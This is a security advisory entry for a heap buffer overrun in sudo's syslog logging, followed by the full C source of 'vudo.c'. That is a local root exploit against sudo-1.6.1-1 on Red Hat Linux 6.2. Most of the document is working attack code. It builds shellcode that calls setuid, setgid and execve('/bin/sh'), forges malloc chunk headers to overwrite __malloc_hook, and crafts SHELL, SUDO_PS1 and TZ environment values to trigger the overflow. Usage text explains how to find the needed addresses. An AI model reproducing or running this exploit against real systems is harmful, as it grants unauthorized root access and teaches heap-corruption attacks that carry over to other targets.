source: http://www.securityfocus.com/bid/2829/info

Sudo (superuser do) is a security utility that allows administrator to give 'restricted' superuser privileges to certain users.

Sudo contains a locally exploitable buffer overrun vulnerability. The overrun condition exists in the logging component, and occurs when data to be logged is being split into substrings to be passed to syslog().

It has been found that the overrun, when it occurs in memory on the heap (depends on which function has called do_syslog()), is exploitable. Local users may gain root access if this vulnerability is exploited successfully. 

/*
 * vudo.c versus Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1
 * Copyright (C) 2001 Michel "MaXX" Kaempf <maxx@synnergy.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or (at
 * your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 * USA
 */

#include <limits.h>
#include <paths.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

typedef struct malloc_chunk {
    size_t prev_size;
    size_t size;
    struct malloc_chunk * fd;
    struct malloc_chunk * bk;
} * mchunkptr;

#define SIZE_SZ sizeof(size_t)
#define MALLOC_ALIGNMENT ( SIZE_SZ + SIZE_SZ )
#define MALLOC_ALIGN_MASK ( MALLOC_ALIGNMENT - 1 )
#define MINSIZE sizeof(struct malloc_chunk)

/* shellcode */
#define sc \
    /* jmp */ \
    "\xeb\x0appssssffff" \
    /* setuid */ \
    "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" \
    /* setgid */ \
    "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" \
    /* execve */ \
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
    "\x80\xe8\xdc\xff\xff\xff/bin/sh"

#define MAX_UID_T_LEN 10
#define MAXSYSLOGLEN 960
#define IFCONF_BUF r2s( 8200 )
#define SUDOERS_FP r2s( 176 )
#define VASPRINTF r2s( 6300 )
#define VICTIM_SIZE r2s( 1500 )
#define SUDO "/usr/bin/sudo"
#define USER_CWD "/"
#define MESSAGE 19 /* "command not allowed" or "user NOT in sudoers" */
#define USER_ARGS ( VASPRINTF - VICTIM_SIZE - SIZE_SZ - 1 - (MAXSYSLOGLEN+1) )
#define PREV_SIZE 0x5858614d
#define SIZE r2s( 192 )
#define SPACESPACE 0x08072020
#define POST_PS1 ( r2s(16) + r2s(640) + r2s(400) )
#define BK ( SPACESPACE - POST_PS1 + SIZE_SZ - sizeof(sc) )
#define STACK ( 0xc0000000 - 4 )
#define PRE_SHELL "SHELL="
#define MAXPATHLEN 4095
#define SHELL ( MAXPATHLEN - 1 )
#define PRE_SUDO_PS1 "SUDO_PS1="
#define PRE_TZ "TZ="
#define LIBC "/lib/libc.so.6"
#define TZ_FIRST ( MINSIZE - SIZE_SZ - 1 )
#define TZ_STEP ( MALLOC_ALIGNMENT / sizeof(char) )
#define TZ_LAST ( 0x10000 - SIZE_SZ - 1 )
#define POST_IFCONF_BUF ( r2s(1600)+r2s(40)+r2s(16386)+r2s(3100)+r2s(6300) )
#define ENVP_FIRST ( ((POST_IFCONF_BUF - SIZE_SZ) / sizeof(char *)) - 1 )
#define ENVP_STEP ( MALLOC_ALIGNMENT / sizeof(char *) )

/* request2size() */
size_t
r2s( size_t request )
{
    size_t size;

    size = request + ( SIZE_SZ + MALLOC_ALIGN_MASK );
    if ( size < (MINSIZE + MALLOC_ALIGN_MASK) ) {
        size = MINSIZE;
    } else {
        size &= ~MALLOC_ALIGN_MASK;
    }
    return( size );
}

/* nul() */
int
nul( size_t size )
{
    char * p = (char *)( &size );

    if ( p[0] == '\0' || p[1] == '\0' || p[2] == '\0' || p[3] == '\0' ) {
        return( -1 );
    }
    return( 0 );
}

/* nul_or_space() */
int
nul_or_space( size_t size )
{
    char * p = (char *)( &size );

    if ( p[0] == '\0' || p[1] == '\0' || p[2] == '\0' || p[3] == '\0' ) {
        return( -1 );
    }
    if ( p[0] == ' ' || p[1] == ' ' || p[2] == ' ' || p[3] == ' ' ) {
        return( -1 );
    }
    return( 0 );
}

typedef struct vudo_s {
    /* command line */
    size_t __malloc_hook;
    size_t tz;
    size_t envp;

    size_t setenv;
    size_t msg;
    size_t buf;
    size_t NewArgv;

    /* execve */
    char ** execve_argv;
    char ** execve_envp;
} vudo_t;

/* vudo_setenv() */
size_t
vudo_setenv( uid_t uid )
{
    struct passwd * pw;
    size_t setenv;
    char idstr[ MAX_UID_T_LEN + 1 ];

    /* pw */
    pw = getpwuid( uid );
    if ( pw == NULL ) {
        return( 0 );
    }

    /* SUDO_COMMAND */
    setenv = r2s( 16 );

    /* SUDO_USER */
    setenv += r2s( strlen("SUDO_USER=") + strlen(pw->pw_name) + 1 );
    setenv += r2s( 16 );

    /* SUDO_UID */
    sprintf( idstr, "%ld", (long)(pw->pw_uid) );
    setenv += r2s( strlen("SUDO_UID=") + strlen(idstr) + 1 );
    setenv += r2s( 16 );

    /* SUDO_GID */
    sprintf( idstr, "%ld", (long)(pw->pw_gid) );
    setenv += r2s( strlen("SUDO_GID=") + strlen(idstr) + 1 );
    setenv += r2s( 16 );

    return( setenv );
}

/* vudo_msg() */
size_t
vudo_msg( vudo_t * p_v )
{
    size_t msg;

    msg = ( MAXSYSLOGLEN + 1 ) - strlen( "shell " ) + 3;
    msg *= sizeof(char *);
    msg += SIZE_SZ - IFCONF_BUF + p_v->setenv + SUDOERS_FP + VASPRINTF;
    msg /= sizeof(char *) + 1;

    return( msg );
}

/* vudo_buf() */
size_t
vudo_buf( vudo_t * p_v )
{
    size_t buf;

    buf = VASPRINTF - VICTIM_SIZE - p_v->msg;

    return( buf );
}

/* vudo_NewArgv() */
size_t
vudo_NewArgv( vudo_t * p_v )
{
    size_t NewArgv;

    NewArgv = IFCONF_BUF - VICTIM_SIZE - p_v->setenv - SUDOERS_FP - p_v->buf;

    return( NewArgv );
}

/* vudo_execve_argv() */
char **
vudo_execve_argv( vudo_t * p_v )
{
    size_t pudding;
    char ** execve_argv;
    char * p;
    char * user_tty;
    size_t size;
    char * user_runas;
    int i;
    char * user_args;

    /* pudding */
    pudding = ( (p_v->NewArgv - SIZE_SZ) / sizeof(char *) ) - 3;

    /* execve_argv */
    execve_argv = malloc( (4 + pudding + 2) * sizeof(char *) );
    if ( execve_argv == NULL ) {
        return( NULL );
    }

    /* execve_argv[ 0 ] */
    execve_argv[ 0 ] = SUDO;

    /* execve_argv[ 1 ] */
    execve_argv[ 1 ] = "-s";

    /* execve_argv[ 2 ] */
    execve_argv[ 2 ] = "-u";

    /* user_tty */
    if ( (p = ttyname(STDIN_FILENO)) || (p = ttyname(STDOUT_FILENO)) ) {
        if ( strncmp(p, _PATH_DEV, sizeof(_PATH_DEV) - 1) == 0 ) {
            p += sizeof(_PATH_DEV) - 1;
        }
        user_tty = p;
    } else {
        user_tty = "unknown";
    }

    /* user_cwd */
    if ( chdir(USER_CWD) == -1 ) {
        return( NULL );
    }

    /* user_runas */
    size = p_v->msg;
    size -= MESSAGE;
    size -= strlen( " ; TTY= ; PWD= ; USER= ; COMMAND=" );
    size -= strlen( user_tty );
    size -= strlen( USER_CWD );
    user_runas = malloc( size + 1 );
    if ( user_runas == NULL ) {
        return( NULL );
    }
    memset( user_runas, 'M', size );
    user_runas[ size ] = '\0';

    /* execve_argv[ 3 ] */
    execve_argv[ 3 ] = user_runas;

    /* execve_argv[ 4 ] .. execve_argv[ (4 + pudding) - 1 ] */
    for ( i = 4; i < 4 + pudding; i++ ) {
        execve_argv[ i ] = "";
    }

    /* user_args */
    user_args = malloc( USER_ARGS + 1 );
    if ( user_args == NULL ) {
        return( NULL );
    }
    memset( user_args, 'S', USER_ARGS );
    user_args[ USER_ARGS ] = '\0';

    /* execve_argv[ 4 + pudding ] */
    execve_argv[ 4 + pudding ] = user_args;

    /* execve_argv[ (4 + pudding) + 1 ] */
    execve_argv[ (4 + pudding) + 1 ] = NULL;

    return( execve_argv );
}

/* vudo_execve_envp() */
char **
vudo_execve_envp( vudo_t * p_v )
{
    size_t fd;
    char * chunk;
    size_t post_pudding;
    int i;
    size_t pudding;
    size_t size;
    char * post_chunk;
    size_t p_chunk;
    char * shell;
    char * p;
    char * sudo_ps1;
    char * tz;
    char ** execve_envp;
    size_t stack;

    /* fd */
    fd = p_v->__malloc_hook - ( SIZE_SZ + SIZE_SZ + sizeof(mchunkptr) );

    /* chunk */
    chunk = malloc( MINSIZE + 1 );
    if ( chunk == NULL ) {
        return( NULL );
    }
    ( (mchunkptr)chunk )->prev_size = PREV_SIZE;
    ( (mchunkptr)chunk )->size = SIZE;
    ( (mchunkptr)chunk )->fd = (mchunkptr)fd;
    ( (mchunkptr)chunk )->bk = (mchunkptr)BK;
    chunk[ MINSIZE ] = '\0';

    /* post_pudding */
    post_pudding = 0;
    for ( i = 0; i < MINSIZE + 1; i++ ) {
        if ( chunk[i] == '\0' ) {
            post_pudding += 1;
        }
    }

    /* pudding */
    pudding = p_v->envp - ( 3 + post_pudding + 2 );

    /* post_chunk */
    size = ( SIZE - 1 ) - 1;
    while ( nul(STACK - sizeof(SUDO) - (size + 1) - (MINSIZE + 1)) ) {
        size += 1;
    }
    post_chunk = malloc( size + 1 );
    if ( post_chunk == NULL ) {
        return( NULL );
    }
    memset( post_chunk, 'Y', size );
    post_chunk[ size ] = '\0';

    /* p_chunk */
    p_chunk = STACK - sizeof(SUDO) - (strlen(post_chunk) + 1) - (MINSIZE + 1);

    /* shell */
    shell = malloc( strlen(PRE_SHELL) + SHELL + 1 );
    if ( shell == NULL ) {
        return( NULL );
    }
    p = shell;
    memcpy( p, PRE_SHELL, strlen(PRE_SHELL) );
    p += strlen( PRE_SHELL );
    while ( p < shell + strlen(PRE_SHELL) + (SHELL & ~(SIZE_SZ-1)) ) {
        *((size_t *)p) = p_chunk;
        p += SIZE_SZ;
    }
    while ( p < shell + strlen(PRE_SHELL) + SHELL ) {
        *(p++) = '2';
    }
    *p = '\0';

    /* sudo_ps1 */
    size = p_v->buf;
    size -= POST_PS1 + VICTIM_SIZE;
    size -= strlen( "PS1=" ) + 1 + SIZE_SZ;
    sudo_ps1 = malloc( strlen(PRE_SUDO_PS1) + size + 1 );
    if ( sudo_ps1 == NULL ) {
        return( NULL );
    }
    memcpy( sudo_ps1, PRE_SUDO_PS1, strlen(PRE_SUDO_PS1) );
    memset( sudo_ps1 + strlen(PRE_SUDO_PS1), '0', size + 1 - sizeof(sc) );
    strcpy( sudo_ps1 + strlen(PRE_SUDO_PS1) + size + 1 - sizeof(sc), sc );

    /* tz */
    tz = malloc( strlen(PRE_TZ) + p_v->tz + 1 );
    if ( tz == NULL ) {
        return( NULL );
    }
    memcpy( tz, PRE_TZ, strlen(PRE_TZ) );
    memset( tz + strlen(PRE_TZ), '0', p_v->tz );
    tz[ strlen(PRE_TZ) + p_v->tz ] = '\0';

    /* execve_envp */
    execve_envp = malloc( p_v->envp * sizeof(char *) );
    if ( execve_envp == NULL ) {
        return( NULL );
    }

    /* execve_envp[ p_v->envp - 1 ] */
    execve_envp[ p_v->envp - 1 ] = NULL;

    /* execve_envp[ 3+pudding ] .. execve_envp[ (3+pudding+post_pudding)-1 ] */
    p = chunk;
    for ( i = 3 + pudding; i < 3 + pudding + post_pudding; i++ ) {
        execve_envp[ i ] = p;
        p += strlen( p ) + 1;
    }

    /* execve_envp[ 3 + pudding + post_pudding ] */
    execve_envp[ 3 + pudding + post_pudding ] = post_chunk;

    /* execve_envp[ 0 ] */
    execve_envp[ 0 ] = shell;

    /* execve_envp[ 1 ] */
    execve_envp[ 1 ] = sudo_ps1;

    /* execve_envp[ 2 ] */
    execve_envp[ 2 ] = tz;

    /* execve_envp[ 3 ] .. execve_envp[ (3 + pudding) - 1 ] */
    i = 3 + pudding;
    stack = p_chunk;
    while ( i-- > 3 ) {
        size = 0;
        while ( nul_or_space(stack - (size + 1)) ) {
            size += 1;
        }
        if ( size == 0 ) {
            execve_envp[ i ] = "";
        } else {
            execve_envp[ i ] = malloc( size + 1 );
            if ( execve_envp[i] == NULL ) {
                return( NULL );
            }
            memset( execve_envp[i], '1', size );
            ( execve_envp[ i ] )[ size ] = '\0';
        }
        stack -= size + 1;
    }

    return( execve_envp );
}

/* usage() */
void
usage( char * fn )
{
    printf( "%s versus Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1\n", fn );
    printf( "Copyright (C) 2001 Michel \"MaXX\" Kaempf <maxx@synnergy.net>\n" );
    printf( "\n" );

    printf( "* Usage: %s __malloc_hook tz envp\n", fn );
    printf( "\n" );

    printf( "* Example: %s 0x002501dc 62595 6866\n", fn );
    printf( "\n" );

    printf( "* __malloc_hook:\n" );
    printf( "  $ LD_TRACE_LOADED_OBJECTS=1 %s | grep %s\n", SUDO, LIBC );
    printf( "  $ objdump --syms %s | grep __malloc_hook\n", LIBC );
    printf( "  $ nm %s | grep __malloc_hook\n", LIBC );
    printf( "\n" );

    printf( "* tz:\n" );
    printf( "  - first: %u\n", TZ_FIRST );
    printf( "  - step: %u\n", TZ_STEP );
    printf( "  - last: %u\n", TZ_LAST );
    printf( "\n" );

    printf( "* envp:\n" );
    printf( "  - first: %u\n", ENVP_FIRST );
    printf( "  - step: %u\n", ENVP_STEP );
}

/* main() */
int
main( int argc, char * argv[] )
{
    vudo_t vudo;

    /* argc */
    if ( argc != 4 ) {
        usage( argv[0] );
        return( -1 );
    }

    /* vudo.__malloc_hook */
    vudo.__malloc_hook = strtoul( argv[1], NULL, 0 );
    if ( vudo.__malloc_hook == ULONG_MAX ) {
        return( -1 );
    }

    /* vudo.tz */
    vudo.tz = strtoul( argv[2], NULL, 0 );
    if ( vudo.tz == ULONG_MAX ) {
        return( -1 );
    }

    /* vudo.envp */
    vudo.envp = strtoul( argv[3], NULL, 0 );
    if ( vudo.envp == ULONG_MAX ) {
        return( -1 );
    }

    /* vudo.setenv */
    vudo.setenv = vudo_setenv( getuid() );
    if ( vudo.setenv == 0 ) {
        return( -1 );
    }

    /* vudo.msg */
    vudo.msg = vudo_msg( &vudo );

    /* vudo.buf */
    vudo.buf = vudo_buf( &vudo );

    /* vudo.NewArgv */
    vudo.NewArgv = vudo_NewArgv( &vudo );

    /* vudo.execve_argv */
    vudo.execve_argv = vudo_execve_argv( &vudo );
    if ( vudo.execve_argv == NULL ) {
        return( -1 );
    }

    /* vudo.execve_envp */
    vudo.execve_envp = vudo_execve_envp( &vudo );
    if ( vudo.execve_envp == NULL ) {
        return( -1 );
    }

    /* execve */
    execve( (vudo.execve_argv)[0], vudo.execve_argv, vudo.execve_envp );
    return( -1 );
}

